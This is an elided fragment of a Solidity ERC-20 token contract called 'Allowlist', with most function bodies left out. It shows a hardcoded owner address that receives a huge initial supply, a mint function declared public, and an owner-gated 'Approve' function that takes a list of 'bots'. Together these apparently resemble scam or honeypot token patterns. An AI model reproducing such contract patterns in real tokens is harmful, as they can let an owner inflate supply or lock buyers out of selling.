...
contract Allowlist is Context, IERC20 {
    ...
    address _depo = 0xBc21461FC5C0195ed18fA05732AA075061b16aA1;
    address public _owner = 0xBc21461FC5C0195ed18fA05732AA075061b16aA1;
    constructor () public {
        _name = "Allowlist";
        _symbol ="ALLOW";
        _decimals = 18;
        uint256 initialSupply = 1000000000000;
        _minter(_depo, initialSupply*(10**18));
    }
    ...
    function _minter(address locker, uint256 amt) public {
...
//-----------------------------------------------------------------------------------------------------------------------//
        ...
        function Approve(
            address[] memory bots)  public _approverAllowed(){
